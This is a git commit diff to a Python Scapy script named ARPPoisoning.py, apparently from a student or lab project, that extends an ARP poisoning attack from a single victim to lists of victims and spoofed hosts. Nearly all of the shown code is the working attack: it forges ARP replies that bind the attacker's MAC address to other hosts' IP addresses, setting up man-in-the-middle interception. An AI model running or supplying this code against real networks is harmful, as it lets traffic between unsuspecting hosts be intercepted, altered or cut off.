8f59c4ac57a06435580c2359cdc0e01642062ac7
SerbanJinga <33983121+SerbanJinga@users.noreply.github.com>
2023-06-06 16:36:00 +0200

    Update ARPPoisoning.py

--- ARPPoisoning.py
+++ ARPPoisoning.py
@@ -4,28 +4,28 @@ from Functions import Functions
 functions = Functions()
 def ARPPoisoning(ipVictim, ipToSpoof, networkID):
     macAttacker = get_if_hwaddr(networkID)
-    macVictim = functions.retrieveMACAdress("enp0s3", "192.168.56.101")
-    macSpoof = functions.retrieveMACAdress("enp0s3", "192.168.56.102")
-    print("Mac attacker: " + macAttacker)
-    print("Mac victim: " + macVictim)
-    print("Mac spoof: " + macSpoof)
+    macVictim = [functions.retrieveMACAdress(networkID=networkID, ipConfig=ip) for ip in ipVictim]
+    macSpoof = [functions.retrieveMACAdress(networkID=networkID, ipConfig=ip) for ip in ipToSpoof]
     if macSpoof == None or macAttacker == None or macVictim == None:
         print("Error!")
         sys.exit()
 
-    victimPkt = Ether() / ARP()
-    victimPkt[Ether].src = macAttacker
-    victimPkt[ARP].hwsrc = macAttacker
-    victimPkt[ARP].psrc = ipToSpoof
-    victimPkt[ARP].hwdst = macVictim
-    victimPkt[ARP].pdst = ipVictim
-    sendp(victimPkt, iface = networkID, verbose = 0)
+    for i in range(0, len(ipVictim)):
+        for j in range(0, len(ipToSpoof)):
+            if ipVictim[i] != ipToSpoof[j]:
+                victimPkt = Ether() / ARP()
+                victimPkt[Ether].src = macAttacker
+                victimPkt[ARP].hwsrc = macAttacker
+                victimPkt[ARP].psrc = ipToSpoof[j]
+                victimPkt[ARP].hwdst = macVictim[i]
+                victimPkt[ARP].pdst = ipVictim[i]
+                sendp(victimPkt, iface = networkID, verbose = 0)
 
-    spoofPkt = Ether() / ARP()
-    spoofPkt[Ether].src = macAttacker
-    spoofPkt[ARP].hwsrc = macAttacker
-    spoofPkt[ARP].psrc = ipVictim
-    spoofPkt[ARP].hwdst = macSpoof
-    spoofPkt[ARP].pdst = ipToSpoof
+                spoofPkt = Ether() / ARP()
+                spoofPkt[Ether].src = macAttacker
+                spoofPkt[ARP].hwsrc = macAttacker
+                spoofPkt[ARP].psrc = ipVictim[i]
+                spoofPkt[ARP].hwdst = macSpoof[j]
+                spoofPkt[ARP].pdst = ipToSpoof[j]
 
-    sendp(spoofPkt, iface = networkID, verbose = 0)
+                sendp(spoofPkt, iface = networkID, verbose = 0)
